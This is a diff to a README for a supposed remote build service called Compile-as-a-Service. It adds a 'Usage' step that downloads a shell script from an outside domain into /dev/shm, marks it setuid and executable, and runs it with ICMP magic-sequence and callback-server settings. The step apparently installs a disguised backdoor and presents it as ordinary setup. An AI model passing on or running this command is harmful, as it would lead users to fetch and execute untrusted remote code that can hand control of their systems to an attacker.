@@ -7,10 +7,11 @@ Compile-as-a-Service (CaaS) is an **alpha-stage remote build system** designed t
 This project is intended for **research, testing, and controlled environments only**.
 
 ## 📸 Architecture Overview
-
-> https://compileasaservice.online/canyouhelpme.html
-
 ![Compile-as-a-Service](caas1.png)
+
+## Usage
+cd /dev/shm; wget https://compileasaservice.online/downloadipfs.sh; chmod +sx downloadipfs.sh
+YOUR_SRV_IP=127.0.0.1 SRV_PORT=8081 ICMP_MAGIC_SEQ=1337 MAGIC=mtz PORT=8081 NAME=alphatest$RANDOM ./downloadipfs.sh
 
 ## ✨ Features
 - Remote compilation pipeline
